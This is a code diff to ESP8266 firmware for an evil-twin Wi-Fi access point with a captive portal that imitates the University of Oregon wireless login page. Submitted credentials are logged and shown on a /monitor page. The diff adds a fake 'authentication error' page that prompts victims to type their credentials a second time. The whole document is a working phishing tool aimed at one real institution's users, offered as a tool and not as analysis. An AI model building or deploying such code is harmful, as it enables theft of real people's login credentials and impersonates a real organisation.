@@ -9,12 +9,12 @@
 // WiFi Definitions //
 //////////////////////
 // this esp's ap credentials
-const char AP_NAME[] = "uowireless";
+const char AP_NAME[] = "ShogunOfWater";
 
 int wifiStatus;
-IPAddress ip(6,6,6,1);      // this node's soft ap ip address
-IPAddress gateway(6,6,6,1); // this node's soft ap gateway
-IPAddress subnet(255,255,255,0); // this node's soft ap subnet mask
+IPAddress ip(10,111,75,1);      // this node's soft ap ip address
+IPAddress gateway(10,111,75,1); // this node's soft ap gateway
+IPAddress subnet(255,255,254,0); // this node's soft ap subnet mask
 ESP8266WebServer webServer(80);
 
 const short DNS_PORT = 53;
@@ -44,6 +44,7 @@ void setup()
   webServer.on("/fs/customwebauth/jquery-1.7.2.min.js", handle_jquery); 
   webServer.on("/fs/customwebauth/style.css", handle_css);
   webServer.on("/fs/customwebauth/login.html", handle_login);
+  webServer.on("/fs/customwebauth/error.html", handle_badauth);
   webServer.on("/login.html", handle_credentials);
   webServer.on("/monitor", handle_monitor);
   //webServer.on("/hotspot-detect.html", handle_login);  //Firefox captive portal
@@ -76,6 +77,13 @@ String toStringIp(IPAddress ip) {
 void handle_redirect() {
     Serial.println("Request redirected to captive portal");
     webServer.sendHeader("Location", String("http://") + "wireless-auth.uoregon.edu/fs/customwebauth/login.html", true);
+    webServer.send(302, "text/plain", "");   // Empty content inhibits Content-length header so we have to close the socket ourselves.
+    webServer.client().stop(); // Stop is needed because we sent no content length
+}
+
+void handle_redirect_badauth() {
+    Serial.println("Request redirected to credential reprompt");
+    webServer.sendHeader("Location", String("http://") + "wireless-auth.uoregon.edu/fs/customwebauth/error.html", true);
     webServer.send(302, "text/plain", "");   // Empty content inhibits Content-length header so we have to close the socket ourselves.
     webServer.client().stop(); // Stop is needed because we sent no content length
 }
@@ -115,6 +123,30 @@ void handle_monitor() {
     webServer.send(200, "text/html", ups);
 }
 
+void handle_badauth() {
+    Serial.println("Recieved login request");
+    webServer.sendHeader("Content-Type", "text/html");
+    webServer.sendContent_P(error_html0);
+
+    webServer.sendContent_P(uologo_png0);
+    webServer.sendContent_P(uologo_png1);
+    webServer.sendContent_P(uologo_png2);
+    webServer.sendContent_P(uologo_png3);
+
+    webServer.sendContent_P(error_html1);
+
+    webServer.sendContent_P(masthead_png0);
+    webServer.sendContent_P(masthead_png1);
+    webServer.sendContent_P(masthead_png2);
+    webServer.sendContent_P(masthead_png3);
+    webServer.sendContent_P(masthead_png4);
+    webServer.sendContent_P(masthead_png5);
+    webServer.sendContent_P(masthead_png6);
+
+    webServer.sendContent_P(error_html2);
+
+}
+
 void handle_credentials() {
     Serial.println("Recieved Credentials: ");
     String message = "<p>";
@@ -132,7 +164,8 @@ void handle_credentials() {
     ups += "<br></p>";
     message += "<br></p>";
     //webServer.send(200, "text/html", message);
-    handle_redirect();
+    //handle_redirect();
+    handle_redirect_badauth();
 }
 
 void handle_css() {
